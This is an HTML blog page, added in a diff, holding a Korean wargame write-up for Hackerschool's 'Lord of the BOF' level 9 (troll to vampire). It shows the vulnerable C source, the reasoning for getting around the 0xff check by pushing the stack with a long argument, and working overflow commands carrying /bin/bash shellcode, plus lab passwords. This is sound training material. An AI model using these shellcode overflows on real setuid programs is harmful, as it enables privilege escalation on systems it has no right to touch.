@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[Wargame] 해커스쿨 BoF LEVEL9 (troll -> vampire) : check 0xbfff</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/assets/css/main.css" type="text/css">
+
+  <!-- Font -->
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link href='//spoqa.github.io/spoqa-han-sans/css/SpoqaHanSans-kr.css' rel='stylesheet' type='text/css'>
+  <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS Feed for Writeup oriented CTF for fun and profit" href="/feed.xml" />
+  <!-- Begin Jekyll SEO tag v2.3.0 -->
+<title>[Wargame] 해커스쿨 BoF LEVEL9 (troll -&gt; vampire) : check 0xbfff | Writeup oriented CTF for fun and profit</title>
+<meta property="og:title" content="[Wargame] 해커스쿨 BoF LEVEL9 (troll -&gt; vampire) : check 0xbfff" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="id = troll pw = aspirin" />
+<meta property="og:description" content="id = troll pw = aspirin" />
+<link rel="canonical" href="http://localhost:4000/2015-11-13/hackerschool-BoF-stage-9/" />
+<meta property="og:url" content="http://localhost:4000/2015-11-13/hackerschool-BoF-stage-9/" />
+<meta property="og:site_name" content="Writeup oriented CTF for fun and profit" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2015-11-13T22:30:00+09:00" />
+<script type="application/ld+json">
+{"name":null,"description":"id = troll pw = aspirin","author":null,"@type":"BlogPosting","url":"http://localhost:4000/2015-11-13/hackerschool-BoF-stage-9/","publisher":null,"image":null,"headline":"[Wargame] 해커스쿨 BoF LEVEL9 (troll -&gt; vampire) : check 0xbfff","dateModified":"2015-11-13T22:30:00+09:00","datePublished":"2015-11-13T22:30:00+09:00","sameAs":null,"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2015-11-13/hackerschool-BoF-stage-9/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+
+  <!-- Google Analytics -->
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', '', 'auto');
+ga('send', 'pageview');
+
+</script>
+
+
+
+</head>
+
+<body>
+  <div class="content-container">
+    <header>
+  <div class="header-small">
+    <a href="http://localhost:4000">Writeup oriented CTF for fun and profit</a>
+  </div>
+</header>
+<div class="post">
+  <div class="post-title">[Wargame] 해커스쿨 BoF LEVEL9 (troll -> vampire) : check 0xbfff</div>
+  <span class="post-date">
+    <time>13 Nov 2015</time>
+  </span>
+  <div class="post-tag">
+    <ul>
+      
+      <li>
+        <a href="http://localhost:4000/tags#bof">
+          <span>bof</span>
+        </a>
+      </li>
+      
+      
+    </ul>
+  </div>
+
+  <ul>
+  <li>id = troll</li>
+  <li>pw = aspirin</li>
+</ul>
+
+<!--more-->
+
+<h2 id="1-문제--vampirec">1. 문제 : vampire.c</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - vampire
+        - check 0xbfff
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"argv error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">47</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'\xbf'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"stack is still your friend.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="c1">// here is changed!
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">46</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\xff'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"but it's not forever</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span> 
+</code></pre></div></div>
+
+<h3 id="11-변경-사항">1.1 변경 사항</h3>
+
+<p>이번에 추가된 제약사항은 <code class="highlighter-rouge">LR</code> 값이 현재 stack 위치이므로 <code class="highlighter-rouge">0xbfff----</code> 이므로 항상 <code class="highlighter-rouge">0xbf</code> <code class="highlighter-rouge">0xff</code> 값이 들어가게 되는데, 이때 <code class="highlighter-rouge">0xff</code> 값을 넣지 못하는 제약사항이다.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="c1">// here is changed!
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">46</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\xff'</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"but it's not forever</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="2-공격-방법-고민">2. 공격 방법 고민</h2>
+
+<p>현재 stack 이 <code class="highlighter-rouge">0xbfff----</code> 부근에 설정이 되고 있어서 <code class="highlighter-rouge">$LR</code> 값이 <code class="highlighter-rouge">0xbfff----</code> 로 설정이 되는데, 이 값을 사용 할 수 없다면 ?</p>
+
+<h3 id="21-lr-값을-수정">2.1 LR 값을 수정</h3>
+
+<p>실제 값은 <code class="highlighter-rouge">0xbf</code>, <code class="highlighter-rouge">0xff</code> 를 사용하지만 다른 값을 넣은 다음에 shellcode 에서 이 값을 수정해서 <code class="highlighter-rouge">0xff</code> 가 되도록 한다 ? 가능할 수도 있겠지만 아직 shellcode 를 마음대로 작성할 수준은 안 되서 일단 패스…</p>
+
+<h3 id="22-stack-이-0xbfff-가-아닌-곳에-잡히도록-설정">2.2 Stack 이 0xbfff 가 아닌 곳에 잡히도록 설정</h3>
+
+<p>이전 문제 경험에 의하면 함수가 실행되기 위해서는 argument pararameter passing 을 위하여 이 값이 main function 아래에 stack 에 잡히게 된다. 이 argument에 매우 긴 값을 넣으며 그만큼 stack 은 위에 잡히게 되어 <code class="highlighter-rouge">0xbfff</code> 가 아니라 그 위 주소에 설정되도록 할 수 있지 않을까 ?</p>
+
+<h4 id="221-nop-50개--0xbffffdd8">2.2.1 NOP 50개 ==&gt; 0xbffffdd8</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x94\xfb\xf0\xbf"'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*50 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<h4 id="222-nop-350개--0xbffffcac">2.2.2 NOP 350개 ==&gt; 0xbffffcac</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x94\xfb\xf0\xbf"'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*350 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'</span><span class="sb">`</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">argv[2]</code> 에 NOP 를 300개 추가하자 stack 위치가 정확하게 300bytes 만큼 올라가서 잡힌다. :)</p>
+
+<h2 id="3-공격">3. 공격</h2>
+
+<p>argument 에 긴 값을 넣어서 stack 이 <code class="highlighter-rouge">0xbfff----</code> 위에 잡힐 수 있도록 공격을 해보자.</p>
+
+<p><img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage9-1.png" alt="img" />
+<img src="https://raw.githubusercontent.com/humb1ec0ding/humb1ec0ding-etc/master/2015/11/stage9-3.png" alt="img" /></p>
+
+<p>NOP 중에서 <code class="highlighter-rouge">0xbffe7648</code>을 <code class="highlighter-rouge">LR</code> 로 이용하여 공격.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./vampire <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "A"*44 + "\x48\x76\xfe\xbf"'</span><span class="sb">`</span>  <span class="sb">`</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*350 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "A"*100000'</span><span class="sb">`</span>                                                                      
+bash: /home/troll/.bashrc: Permission denied
+
+bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="4-다음-단계-정보">4. 다음 단계 정보</h2>
+
+<p>실제 exploit 을 위해서는 명령실행환경에서의 <code class="highlighter-rouge">agv[0]</code>의 위치를 정확하게 알아야 한다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>509<span class="o">(</span>vampire<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>508<span class="o">(</span>troll<span class="o">)</span>
+
+bash<span class="nv">$ </span>my-pass
+euid <span class="o">=</span> 509
+music world
+</code></pre></div></div>
+
+
+  <!-- Disqus -->
+  
+  <div class="post-disqus">
+      <section id="disqus_thread"></section>
+      <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables */
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//humb1ec0ding.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  </div>
+  
+
+</div>
+
+
+    <!-- Documents about icons are here: http://fontawesome.io/icons/ -->
+<div class="footer">
+  <hr />
+  <div class="footer-link">
+    
+	
+	
+	
+	
+
+    
+    <a href="https://twitter.com/humb1ec0ding"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+
+    
+    <a href="https://github.com/humb1ec0ding"><i class="fa fa-github" aria-hidden="true"></i></a>
+    
+	
+	
+	
+	
+
+    
+	
+	
+	
+	
+	
+	
+	
+	
+
+    
+
+    
+
+    
+    <a href="mailto:humblecoding@gmail.com"><i class="fa fa-envelope" aria-hidden="true"></i></a>
+    
+
+  </div>
+  © 2017 humb1ec0ding. All rights reserved.
+</div>
+
+  </div>
+</body>
+</html>
